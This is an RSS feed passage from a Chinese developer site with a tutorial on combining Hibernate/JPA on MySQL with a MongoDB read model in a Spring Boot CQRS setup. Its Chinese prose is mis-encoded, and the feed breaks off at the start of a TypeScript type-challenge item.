<link>https://juejin.cn/post/7600955777316519974</link>    <guid>https://juejin.cn/post/7600955777316519974</guid>    <pubDate>2026-01-30T23:40:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777316519974" data-draft-id="7600953879501406259" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ76ï¼‰å¦‚ä½•åœ¨æ··åˆæŒä¹…åŒ–ç¯å¢ƒä¸­ä½¿ç”¨Hibernateï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-30T23:40:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ76ï¼‰å¦‚ä½•åœ¨æ··åˆæŒä¹…åŒ–ç¯å¢ƒä¸­ä½¿ç”¨Hibernateï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T23:40:58.000Z" title="Fri Jan 30 2026 23:40:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨æ··åˆæŒä¹…åŒ–ç¯å¢ƒä¸­ä½¿ç”¨Hibernateï¼Œæ„å‘³ç€ä½¿ç”¨ä¸åŒçš„æ•°æ®åº“æˆ–å­˜å‚¨æŠ€æœ¯æ¥å¤„ç†ä¸åŒçš„æ•°æ®æŒä¹…åŒ–éœ€æ±‚ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥åŒæ—¶ä½¿ç”¨å…³ç³»å‹æ•°æ®åº“ï¼ˆå¦‚MySQLï¼‰å’ŒNoSQLæ•°æ®åº“ï¼ˆå¦‚MongoDBï¼‰ã€‚è¿™ç§æ–¹æ³•åœ¨CQRSï¼ˆCommand Query Responsibility Segregationï¼‰æˆ–å…¶ä»–å¤šå­˜å‚¨æŠ€æœ¯æ¶æ„ä¸­éå¸¸å¸¸è§ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬å°†å±•ç¤ºå¦‚ä½•åœ¨Spring Booté¡¹ç›®ä¸­ç»“åˆHibernateå’ŒMongoDBå®ç°æ··åˆæŒä¹…åŒ–ã€‚</p>
<h3 data-id="heading-0">1. é¡¹ç›®ä¾èµ–</h3>
<p>åœ¨<code>pom.xml</code>ä¸­æ·»åŠ å¿…è¦çš„ä¾èµ–ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- Spring Boot Starter Data JPA --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- MySQL Connector --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.26<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- HikariCP for Connection Pooling --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.zaxxer<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>HikariCP<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring Boot Starter Web --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring Boot Starter Data MongoDB --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-mongodb<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Lombok --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.20<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h3 data-id="heading-1">2. é…ç½®æ•°æ®æºå’Œå±æ€§</h3>
<p>åœ¨<code>application.properties</code>ä¸­é…ç½®MySQLå’ŒMongoDBæ•°æ®æºï¼š</p>
<pre><code class="hljs language-properties" lang="properties"># MySQL Database Configuration
spring.datasource.url=jdbc:mysql://localhost:3306/mydatabase
spring.datasource.username=root
spring.datasource.password=rootpassword
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver

spring.jpa.hibernate.ddl-auto=update
spring.jpa.show-sql=true
spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.MySQLDialect

# MongoDB Configuration
spring.data.mongodb.host=localhost
spring.data.mongodb.port=27017
spring.data.mongodb.database=myquerydatabase
</code></pre>
<h3 data-id="heading-2">3. åˆ›å»ºé¢†åŸŸæ¨¡å‹</h3>
<h4 data-id="heading-3">ä½¿ç”¨MySQLçš„å®ä½“ç±»å’Œä»“å‚¨æ¥å£</h4>
<h5 data-id="heading-4"><code>Order.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> javax.persistence.*;
<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Order</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;

    <span class="hljs-meta">@OneToMany(cascade = CascadeType.ALL, orphanRemoval = true)</span>
    <span class="hljs-meta">@JoinColumn(name = "order_id")</span>
    <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addItem</span><span class="hljs-params">(OrderItem item)</span> {
        items.add(item);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeItem</span><span class="hljs-params">(OrderItem item)</span> {
        items.remove(item);
    }

    <span class="hljs-comment">// Business logic methods</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">calculateTotalPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> items.stream().mapToDouble(OrderItem::getTotalPrice).sum();
    }
}
</code></pre>
<h5 data-id="heading-5"><code>OrderItem.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "order_items")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderItem</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;

    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getTotalPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> quantity * price;
    }
}
</code></pre>
<h5 data-id="heading-6"><code>OrderRepository.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JpaRepository</span>&lt;Order, Long&gt; {
}
</code></pre>
<h4 data-id="heading-7">ä½¿ç”¨MongoDBçš„å®ä½“ç±»å’Œä»“å‚¨æ¥å£</h4>
<h5 data-id="heading-8"><code>OrderView.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> org.springframework.data.annotation.Id;
<span class="hljs-keyword">import</span> org.springframework.data.mongodb.core.mapping.Document;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Document(collection = "orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderView</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-keyword">private</span> String id;
    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> totalPrice;
}
</code></pre>
<h5 data-id="heading-9"><code>OrderViewRepository.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.mongodb.repository.MongoRepository;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderViewRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MongoRepository</span>&lt;OrderView, String&gt; {
}
</code></pre>
<h3 data-id="heading-10">4. åˆ›å»ºæœåŠ¡å±‚</h3>
<h4 data-id="heading-11">å†™æ“ä½œæœåŠ¡ï¼ˆCommand Serviceï¼‰</h4>
<h5 data-id="heading-12"><code>OrderCommandService.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCommandService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderRepository orderRepository;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderViewRepository orderViewRepository;

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">savedOrder</span> <span class="hljs-operator">=</span> orderRepository.save(order);
        syncOrderView(savedOrder);
        <span class="hljs-keyword">return</span> savedOrder;
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">updatedOrder</span> <span class="hljs-operator">=</span> orderRepository.save(order);
        syncOrderView(updatedOrder);
        <span class="hljs-keyword">return</span> updatedOrder;
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(Long id)</span> {
        orderRepository.deleteById(id);
        orderViewRepository.deleteById(id.toString());
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">syncOrderView</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">OrderView</span> <span class="hljs-variable">orderView</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderView</span>();
        orderView.setId(order.getId().toString());
        orderView.setCustomerName(order.getCustomerName());
        orderView.setCustomerAddress(order.getCustomerAddress());
        orderView.setTotalPrice(order.calculateTotalPrice());
        orderViewRepository.save(orderView);
    }
}
</code></pre>
<h4 data-id="heading-13">è¯»æ“ä½œæœåŠ¡ï¼ˆQuery Serviceï¼‰</h4>
<h5 data-id="heading-14"><code>OrderQueryService.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> java.util.Optional;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderQueryService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderViewRepository orderViewRepository;

    <span class="hljs-keyword">public</span> List&lt;OrderView&gt; <span class="hljs-title function_">getAllOrders</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> orderViewRepository.findAll();
    }

    <span class="hljs-keyword">public</span> Optional&lt;OrderView&gt; <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(String id)</span> {
        <span class="hljs-keyword">return</span> orderViewRepository.findById(id);
    }
}
</code></pre>
<h3 data-id="heading-15">5. åˆ›å»ºæ§åˆ¶å™¨</h3>
<h4 data-id="heading-16">å†™æ“ä½œæ§åˆ¶å™¨ï¼ˆCommand Controllerï¼‰</h4>
<h5 data-id="heading-17"><code>OrderCommandController.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCommandController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderCommandService orderCommandService;

    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">createOrder</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> CreateOrderRequest request)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();
        order.setCustomerName(request.getCustomerName());
        order.setCustomerAddress(request.getCustomerAddress());
        order.getItems().addAll(request.getItems());
        <span class="hljs-type">Order</span> <span class="hljs-variable">createdOrder</span> <span class="hljs-operator">=</span> orderCommandService.createOrder(order);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(createdOrder);
    }

    <span class="hljs-meta">@PutMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id, <span class="hljs-meta">@RequestBody</span> UpdateOrderRequest request)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();
        order.setId(id);
        order.setCustomerName(request.getCustomerName());
        order.setCustomerAddress(request.getCustomerAddress());
        order.getItems().addAll(request.getItems());
        <span class="hljs-type">Order</span> <span class="hljs-variable">updatedOrder</span> <span class="hljs-operator">=</span> orderCommandService.updateOrder(order);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(updatedOrder);
    }

    <span class="hljs-meta">@DeleteMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Void&gt; <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        orderCommandService.deleteOrder(id);
        <span class="hljs-keyword">return</span> ResponseEntity.noContent().build();
    }
}
</code></pre>
<h4 data-id="heading-18">è¯»æ“ä½œæ§åˆ¶å™¨ï¼ˆQuery Controllerï¼‰</h4>
<h5 data-id="heading-19"><code>OrderQueryController.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/order-views")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderQueryController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderQueryService orderQueryService;

    <span class="hljs-meta">@GetMapping</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;List&lt;OrderView&gt;&gt; <span class="hljs-title function_">getAllOrders</span><span class="hljs-params">()</span> {
        List&lt;OrderView&gt; orders = orderQueryService.getAllOrders();
        <span class="hljs-keyword">return</span> ResponseEntity.ok(orders);
    }

    <span class="hljs-meta">@GetMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;OrderView&gt; <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String id)</span> {
        <span class="hljs-keyword">return</span> orderQueryService.getOrderById(id)
                .map(ResponseEntity::ok)
                .orElse(ResponseEntity.notFound().build());
    }
}
</code></pre>
<h4 data-id="heading-20">è¯·æ±‚å¯¹è±¡</h4>
<h5 data-id="heading-21"><code>CreateOrderRequest.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateOrderRequest</span> {
    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;
    <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items;
}
</code></pre>
<h5 data-id="heading-22"><code>UpdateOrderRequest.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UpdateOrderRequest</span> {
    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;
    <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items;
}
</code></pre>
<h3 data-id="heading-23">6. è¿è¡Œåº”ç”¨</h3>
<ol>
<li><strong>å¯åŠ¨MySQL</strong>ï¼šç¡®ä¿ä½ çš„MySQLæ•°æ®åº“è¿è¡Œåœ¨<code>localhost:3306</code>ã€‚</li>
<li><strong>åˆ›å»ºæ•°æ®åº“</strong>ï¼šåˆ›å»ºä¸€ä¸ªåä¸º<code>mydatabase</code>çš„æ•°æ®åº“ã€‚</li>
<li><strong>å¯åŠ¨MongoDB</strong>ï¼šç¡®ä¿MongoDBæ•°æ®åº“è¿è¡Œåœ¨<code>localhost:27017</code>ã€‚</li>
<li><strong>å¯åŠ¨Spring Bootåº”ç”¨</strong>ï¼šè¿è¡ŒSpring Bootåº”ç”¨ç¨‹åºã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[type-challengesï¼ˆtsç±»å‹ä½“æ“ï¼‰: 10 - å…ƒç»„è½¬åˆé›†]]></title>    <link>https://juejin.cn/post/7600955777316241446</link>    <guid>https://juejin.cn/post/7600955777316241446</guid>    <pubDate>2026-01-30T15:13:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777316241446" data-draft-id="7601028900885987374" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="type-challengesï¼ˆtsç±»å‹ä½“æ“ï¼‰: 10 - å…ƒç»„è½¬åˆé›†"/> <meta itemprop="keywords" content="TypeScript"/> <meta itemprop="datePublished" content="2026-01-30T15:13:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="fxss"/> <meta itemprop="url" content="https://juejin.cn/user/3702810892856808"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 